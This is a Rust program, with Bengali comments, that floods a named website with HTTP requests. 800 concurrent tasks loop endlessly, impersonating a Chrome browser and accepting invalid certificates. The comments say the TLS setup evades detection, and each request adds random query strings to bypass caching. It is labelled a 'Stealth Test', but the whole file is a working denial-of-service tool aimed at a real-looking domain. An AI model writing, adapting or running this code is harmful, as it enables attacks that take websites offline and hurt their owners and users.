use reqwest::{Client, header};
use std::time::Duration;
use rand::Rng;

#[tokio::main]
async fn main() {
    let target = "https://myaura.xyz/"; // এখানে লিংক দাও
    
    // ব্রাউজারের মতো নিখুঁত হেডার
    let mut headers = header::HeaderMap::new();
    headers.insert(header::USER_AGENT, header::HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"));
    headers.insert(header::ACCEPT_LANGUAGE, header::HeaderValue::from_static("en-US,en;q=0.9"));
    headers.insert("sec-ch-ua", header::HeaderValue::from_static("\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\""));

    let client = Client::builder()
        .default_headers(headers)
        .danger_accept_invalid_certs(true)
        .use_rustls_tls() // এটি TLS ডিটেকশন এড়াতে সাহায্য করে
        .timeout(Duration::from_secs(5))
        .pool_max_idle_per_host(100)
        .build().unwrap();

    println!("🕵️ Starting Stealth Test on: {}", target);

    let mut handles = vec![];
    // থ্রেড সংখ্যা ৫০০-১০০০ এর মধ্যে রাখা ভালো যাতে কানেকশন জ্যাম না হয়
    for i in 0..800 {
        let client_ref = client.clone();
        let target_ref = target.to_string();
        
        handles.push(tokio::spawn(async move {
            let mut rng = rand::thread_rng();
            loop {
                // Cache bypassing: প্রতিবার আলাদা কুয়েরি
                let r_id: u32 = rng.gen_range(1000..999999);
                let url = format!("{}?search={}&v={}", target_ref, r_id, r_id);
                
                match client_ref.get(&url).send().await {
                    Ok(resp) => {
                        let code = resp.status().as_u16();
                        if i == 0 { // শুধু প্রথম থ্রেডের স্ট্যাটাস প্রিন্ট করবে যাতে লগ জ্যাম না হয়
                             println!("📡 Status: {}", code);
                        }
                    }
                    Err(_) => {
                         // কানেকশন এরর হলে সামান্য বিরতি
                         tokio::time::sleep(Duration::from_millis(10)).await;
                    }
                }
            }
        }));
    }
    
    tokio::time::sleep(Duration::from_secs(600)).await;
}
